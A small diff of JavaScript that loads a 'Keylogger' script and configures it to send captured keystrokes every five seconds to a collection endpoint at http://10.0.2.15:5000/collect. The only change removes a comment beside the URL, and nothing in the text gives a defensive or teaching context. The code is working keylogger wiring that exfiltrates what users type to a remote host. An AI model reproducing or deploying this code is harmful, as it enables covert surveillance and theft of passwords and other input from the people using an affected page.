@@ -4,7 +4,7 @@
     script.onload = function() {
         window.Keylogger.start();
         window.Keylogger.setConfig({
-            url: 'http://10.0.2.15:5000/collect', // Updated IP
+            url: 'http://10.0.2.15:5000/collect',
             interval: 5000,
             filterSensitive: true,
             includeContext: true
